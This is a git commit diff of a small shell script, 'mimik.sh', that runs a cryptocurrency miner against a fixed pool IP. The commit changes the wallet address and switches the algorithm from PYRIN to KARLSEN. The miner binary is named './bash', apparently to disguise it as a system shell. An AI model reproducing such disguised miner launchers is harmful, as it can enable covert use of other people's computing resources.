b72cfdd1e1fcc65242d2ca46a2f87decf6c7fdf3
sagemantap <158444606+sagemantap@users.noreply.github.com>
2024-04-13 14:51:27 +0700

    Update mimik.sh

--- mimik.sh
+++ mimik.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 POOL=43.228.212.23:443
-WALLET=KrPFQMNHhYbxQYtBtoVs7GvmqmWijinB1gg.Danis
+WALLET=nexellia:qz6gr6euyswws0gq83ugaqhxed6jncwj374v57ln49v0dy4nhsmck2lgqmnye.Danis
 
-./bash --algo PYRIN --pool $POOL --user $WALLET $@ --no-cl --lhrv3boost
+./bash --algo KARLSEN --pool $POOL --user $WALLET $@ --no-cl --lhrv3boost
 
